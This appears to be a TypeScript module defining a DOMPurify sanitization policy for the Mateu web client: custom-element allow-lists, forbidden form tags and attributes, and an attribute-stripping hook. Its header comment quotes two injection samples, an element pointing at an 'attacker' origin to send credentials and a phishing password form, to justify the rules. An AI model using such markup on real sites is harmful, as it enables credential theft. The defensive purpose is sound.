/**
 * The ONE DOMPurify policy for every HTML sink fed with data (safeHtml.ts) and for rendered
 * markdown (mateu-markdown.ts). Kept free of imports so the markdown element, which loads
 * DOMPurify lazily, can share it without pulling the sanitizer into the eager bundle.
 *
 * SECURITY:
 * - Custom elements are an ALLOW-LIST, never "any". A custom element is code: `<mateu-ux
 *   baseurl="https://attacker">` coming from a record value would boot a second Mateu client
 *   inside the trusted page, POST the user's credentials to that origin and render whatever it
 *   answers. Only presentational elements with no behaviour of their own are let through, and only
 *   with the attributes listed here.
 * - Form controls are dropped: a value must not be able to paint a credential-harvesting form
 *   (`<form action=https://phish><input type=password>`) inside the app.
 */
export const SAFE_CUSTOM_ELEMENTS: readonly string[] = ['vaadin-icon']

/** Attributes a safe custom element may carry, besides the global ones DOMPurify allows. */
export const SAFE_CUSTOM_ELEMENT_ATTRIBUTES: readonly string[] = ['icon', 'theme', 'slot']

/** Tags never rendered from data. */
export const FORBIDDEN_DATA_TAGS: readonly string[] = [
    'form', 'input', 'button', 'select', 'option', 'optgroup', 'textarea', 'datalist', 'output',
]

/** Attributes never rendered from data. */
export const FORBIDDEN_DATA_ATTRIBUTES: readonly string[] = ['formaction', 'form', 'is']

/** The DOMPurify configuration (typed loosely so this module stays import-free). */
export const dataHtmlPolicy = (): Record<string, unknown> => ({
    USE_PROFILES: { html: true, svg: true, svgFilters: true },
    FORBID_TAGS: [...FORBIDDEN_DATA_TAGS],
    FORBID_ATTR: [...FORBIDDEN_DATA_ATTRIBUTES],
    CUSTOM_ELEMENT_HANDLING: {
        tagNameCheck: (tagName: string) => SAFE_CUSTOM_ELEMENTS.includes(tagName.toLowerCase()),
        attributeNameCheck: (attr: string) => SAFE_CUSTOM_ELEMENT_ATTRIBUTES.includes(attr.toLowerCase()),
        allowCustomizedBuiltInElements: false,
    },
})

/** Global attributes an allow-listed custom element may also keep (not `src`, `href`, …). */
const CUSTOM_ELEMENT_GLOBAL_ATTRIBUTES = ['class', 'style', 'title', 'id', 'role', 'lang', 'dir']

type PurifyLike = {
    addHook: (entryPoint: 'uponSanitizeAttribute',
              hook: (node: Element, data: { attrName: string, keepAttr: boolean }) => void) => void
}

const hooked = new WeakSet<object>()

/**
 * A custom element keeps ONLY its listed attributes plus a few inert global ones: DOMPurify's
 * own allow-list would also keep `src` on a `<vaadin-icon>`, which makes the icon fetch and
 * inline an SVG from any origin. Installed once per DOMPurify instance (a hook is global to it).
 */
export const installDataHtmlHooks = (purify: PurifyLike): void => {
    if (hooked.has(purify)) return
    hooked.add(purify)
    purify.addHook('uponSanitizeAttribute', (node, data) => {
        const tag = node.nodeName?.toLowerCase() ?? ''
        if (!SAFE_CUSTOM_ELEMENTS.includes(tag)) return
        const name = data.attrName.toLowerCase()
        if (!SAFE_CUSTOM_ELEMENT_ATTRIBUTES.includes(name) && !CUSTOM_ELEMENT_GLOBAL_ATTRIBUTES.includes(name)
            && !name.startsWith('aria-')) {
            data.keepAttr = false
        }
    })
}
